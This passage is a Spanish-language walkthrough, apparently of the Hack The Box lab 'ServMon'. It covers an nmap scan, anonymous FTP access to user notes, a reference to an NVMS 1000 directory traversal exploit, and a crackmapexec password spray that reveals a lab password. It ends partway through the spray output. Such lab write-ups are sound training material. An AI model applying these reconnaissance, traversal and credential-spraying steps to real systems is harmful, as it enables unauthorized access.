&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.91 scan initiated Wed May 12 19:53:55 2021 as: nmap -Pn -p21,22,80,135,139,445,5040,5666,6063,6699,7680,49664,49665,49666,49667,49668,49669,49670 -sC -sV -oN port_scan 10.10.10.184&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.184 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.10.184&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.096s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ftp-anon: Anonymous FTP login allowed &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;FTP code 230&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_01-18-20  12:05PM       &amp;lt;DIR&amp;gt;          Users
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ftp-syst:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  SYST: Windows_NT
22/tcp    open  ssh           OpenSSH for_Windows_7.7 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;2048&lt;/span&gt; b9:89:04:ae:b6:26:07:3f:61:89:75:cf:10:29:28:83 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 71:4e:6c:c0:d3:6e:57:4f:06:b8:95:3d:c7:75:57:53 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 15:38:bd:75:06:71:67:7a:01:17:9c:5c:ed:4c:de:0e &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp    open  http
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; fingerprint-strings:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   GetRequest, HTTPOptions, RTSPRequest:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     HTTP/1.1 &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; OK
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Content-type: text/html
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Content-Length: &lt;span class=&#34;m&#34;&gt;340&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Connection: close
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     AuthInfo:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;!DOCTYPE html PUBLIC &lt;span class=&#34;s2&#34;&gt;&amp;#34;-//W3C//DTD XHTML 1.0 Transitional//EN&amp;#34;&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&amp;#34;&lt;/span&gt;&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;html &lt;span class=&#34;nv&#34;&gt;xmlns&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;http://www.w3.org/1999/xhtml&amp;#34;&lt;/span&gt;&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;head&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;title&amp;gt;&amp;lt;/title&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;script &lt;span class=&#34;nv&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;text/javascript&amp;#34;&lt;/span&gt;&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     window.location.href &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Pages/login.htm&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;/script&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;/head&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;body&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;/body&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;/html&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   NULL:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     HTTP/1.1 &lt;span class=&#34;m&#34;&gt;408&lt;/span&gt; Request Timeout
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Content-type: text/html
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Content-Length: &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Connection: close
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_    AuthInfo:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Site doesn&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;t have a title &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;text/html&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
5666/tcp  open  tcpwrapped
6063/tcp  open  tcpwrapped
6699/tcp  open  napster?
7680/tcp  open  pando-pub?
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;7.91%I&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;7%D&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;5/12%Time&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;609C6A98%P&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;x86_64-pc-linux-gnu%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;NULL
SF:,6B,&lt;span class=&#34;s2&#34;&gt;&amp;#34;HTTP/1\.1\x20408\x20Request\x20Timeout\r\nContent-type:\x20text/ht
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:ml\r\nContent-Length:\x200\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:\r\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;GetRequest,1B4,&lt;span class=&#34;s2&#34;&gt;&amp;#34;HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20tex
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:t/html\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:20\r\n\r\n\xef\xbb\xbf&amp;lt;!DOCTYPE\x20html\x20PUBLIC\x20\&amp;#34;-//W3C//DTD\x20X
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:HTML\x201\.0\x20Transitional//EN\&amp;#34;\x20\&amp;#34;http://www\.w3\.org/TR/xhtml1/D
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:TD/xhtml1-transitional\.dtd\&amp;#34;&amp;gt;\r\n\r\n&amp;lt;html\x20xmlns=\&amp;#34;http://www\.w3\.
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:org/1999/xhtml\&amp;#34;&amp;gt;\r\n&amp;lt;head&amp;gt;\r\n\x20\x20\x20\x20&amp;lt;title&amp;gt;&amp;lt;/title&amp;gt;\r\n\x20\
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:x20\x20\x20&amp;lt;script\x20type=\&amp;#34;text/javascript\&amp;#34;&amp;gt;\r\n\x20\x20\x20\x20\x20
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:\x20\x20\x20window\.location\.href\x20=\x20\&amp;#34;Pages/login\.htm\&amp;#34;;\r\n\x2
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:0\x20\x20\x20&amp;lt;/script&amp;gt;\r\n&amp;lt;/head&amp;gt;\r\n&amp;lt;body&amp;gt;\r\n&amp;lt;/body&amp;gt;\r\n&amp;lt;/html&amp;gt;\r\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
SF:%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;HTTPOptions,1B4,&lt;span class=&#34;s2&#34;&gt;&amp;#34;HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/htm
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:l\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:n\r\n\xef\xbb\xbf&amp;lt;!DOCTYPE\x20html\x20PUBLIC\x20\&amp;#34;-//W3C//DTD\x20XHTML\
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:x201\.0\x20Transitional//EN\&amp;#34;\x20\&amp;#34;http://www\.w3\.org/TR/xhtml1/DTD/xh
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:tml1-transitional\.dtd\&amp;#34;&amp;gt;\r\n\r\n&amp;lt;html\x20xmlns=\&amp;#34;http://www\.w3\.org/1
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:999/xhtml\&amp;#34;&amp;gt;\r\n&amp;lt;head&amp;gt;\r\n\x20\x20\x20\x20&amp;lt;title&amp;gt;&amp;lt;/title&amp;gt;\r\n\x20\x20\x
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:20\x20&amp;lt;script\x20type=\&amp;#34;text/javascript\&amp;#34;&amp;gt;\r\n\x20\x20\x20\x20\x20\x20\
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:x20\x20window\.location\.href\x20=\x20\&amp;#34;Pages/login\.htm\&amp;#34;;\r\n\x20\x20
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:\x20\x20&amp;lt;/script&amp;gt;\r\n&amp;lt;/head&amp;gt;\r\n&amp;lt;body&amp;gt;\r\n&amp;lt;/body&amp;gt;\r\n&amp;lt;/html&amp;gt;\r\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RT
SF:SPRequest,1B4,&lt;span class=&#34;s2&#34;&gt;&amp;#34;HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/html\r\n
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:Content-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\r\n
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:\xef\xbb\xbf&amp;lt;!DOCTYPE\x20html\x20PUBLIC\x20\&amp;#34;-//W3C//DTD\x20XHTML\x201\
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:.0\x20Transitional//EN\&amp;#34;\x20\&amp;#34;http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:transitional\.dtd\&amp;#34;&amp;gt;\r\n\r\n&amp;lt;html\x20xmlns=\&amp;#34;http://www\.w3\.org/1999/x
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:html\&amp;#34;&amp;gt;\r\n&amp;lt;head&amp;gt;\r\n\x20\x20\x20\x20&amp;lt;title&amp;gt;&amp;lt;/title&amp;gt;\r\n\x20\x20\x20\x2
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:0&amp;lt;script\x20type=\&amp;#34;text/javascript\&amp;#34;&amp;gt;\r\n\x20\x20\x20\x20\x20\x20\x20\x
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:20window\.location\.href\x20=\x20\&amp;#34;Pages/login\.htm\&amp;#34;;\r\n\x20\x20\x20\
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:x20&amp;lt;/script&amp;gt;\r\n&amp;lt;/head&amp;gt;\r\n&amp;lt;body&amp;gt;\r\n&amp;lt;/body&amp;gt;\r\n&amp;lt;/html&amp;gt;\r\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
Service Info: OS: Windows&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows

Host script results:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_clock-skew: 4m17s
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb2-security-mode:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   2.02:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_    Message signing enabled but not required
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb2-time:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   date: 2021-05-13T00:00:59
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Wed May 12 19:57:10 2021 -- 1 IP address (1 host up) scanned in 195.09 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;ftp&#34;&gt;FTP&lt;/h1&gt;
&lt;p&gt;En el servicio FTP encontramos dos archivos en las carpetas de los usuarios &lt;code&gt;Nadine&lt;/code&gt; y &lt;code&gt;Nathan&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;ftp&amp;gt; dir
&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; PORT &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; successful.
&lt;span class=&#34;m&#34;&gt;125&lt;/span&gt; Data connection already open&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; Transfer starting.
01-18-20  12:06PM       &amp;lt;DIR&amp;gt;          Nadine
01-18-20  12:08PM       &amp;lt;DIR&amp;gt;          Nathan
&lt;span class=&#34;m&#34;&gt;226&lt;/span&gt; Transfer complete.
ftp&amp;gt; dir Nadine
&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; PORT &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; successful.
&lt;span class=&#34;m&#34;&gt;125&lt;/span&gt; Data connection already open&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; Transfer starting.
01-18-20  12:08PM                  &lt;span class=&#34;m&#34;&gt;174&lt;/span&gt; Confidential.txt
&lt;span class=&#34;m&#34;&gt;226&lt;/span&gt; Transfer complete.
ftp&amp;gt; dir Nathan
&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; PORT &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; successful.
&lt;span class=&#34;m&#34;&gt;125&lt;/span&gt; Data connection already open&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; Transfer starting.
01-18-20  12:10PM                  &lt;span class=&#34;m&#34;&gt;186&lt;/span&gt; Notes to &lt;span class=&#34;k&#34;&gt;do&lt;/span&gt;.txt
&lt;span class=&#34;m&#34;&gt;226&lt;/span&gt; Transfer complete.
ftp&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;El primer archivo indica que la contrase√±a de Nathan esta en el escritorio y en el archivo &lt;code&gt;Passwords.txt&lt;/code&gt;. En el segundo archivo se listan cosas por hacer.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;œÄ ~/htb/servmon ‚ùØ cat Confidential.txt
Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards

Nadine

œÄ ~/htb/servmon ‚ùØ cat Notes&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;to&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;do&lt;/span&gt;.txt
1&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Change the password &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; NVMS - Complete
2&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Lock down the NSClient Access - Complete
3&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Upload the passwords
4&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Remove public access to NVMS
5&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Place the secret files in SharePoint
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;smb&#34;&gt;SMB&lt;/h1&gt;
&lt;p&gt;Intentamos listar los recursos compartidos con una sesion nula pero no tenemos acceso.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;œÄ ~/htb/servmon ‚ùØ cme smb 10.10.10.184 -u &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt; -p &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt; --shares
SMB         10.10.10.184    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    SERVMON          &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Windows 10.0 Build &lt;span class=&#34;m&#34;&gt;18362&lt;/span&gt; x64 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;name:SERVMON&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;domain:ServMon&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;signing:False&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
SMB         10.10.10.184    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    SERVMON          &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; ServMon&lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt; STATUS_ACCESS_DENIED
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;nadine---user&#34;&gt;NADINE - USER&lt;/h1&gt;
&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
&lt;p&gt;Encontramos un login de &lt;strong&gt;NVMS 1000&lt;/strong&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/servmon/2021-05-1218_21_10-Window.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;nvms-1000---directory-traversal&#34;&gt;NVMS 1000 - Directory Traversal&lt;/h2&gt;
&lt;p&gt;Realizamos una busqueda de vulnerabilidades en NVMS y vemos un &lt;a href=&#34;https://www.exploit-db.com/exploits/47774&#34;&gt;exploit&lt;/a&gt; que indica una vulnerabilidad &lt;strong&gt;Directory Traversal&lt;/strong&gt;, tambien vemos el &lt;a href=&#34;https://www.exploit-db.com/exploits/48311&#34;&gt;exploit&lt;/a&gt; que realiza la &amp;ldquo;explotacion&amp;rdquo;.&lt;/p&gt;
&lt;p&gt;En una de las notas indica que existe un archivo en el escritorio de uno de los usuarios, realizamos una solicitud a ese archivo y encontramos varias contrase√±as.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/servmon/2021-05-1218_32_00-Window.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos &lt;strong&gt;crackmapexec&lt;/strong&gt; con una peque√±a lista de usuarios y contrase√±as al servicio smb, logramos encontrar las correctas aunque no vemos ningun recurso en samba, por lo que verificamos en SSH y logramos ver que la contrase√±a es aceptada con el usuario &lt;code&gt;nadine&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;œÄ ~/htb/servmon ‚ùØ cme smb 10.10.10.184 -u users.txt -p passwords.txt
SMB         10.10.10.184    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    SERVMON          &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Windows 10.0 Build &lt;span class=&#34;m&#34;&gt;18362&lt;/span&gt; x64 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;name:SERVMON&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;domain:ServMon&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;signing:False&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
SMB         10.10.10.184    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    SERVMON          &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; ServMon&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;athan:1nsp3ctTh3Way2Mars! STATUS_LOGON_FAILURE
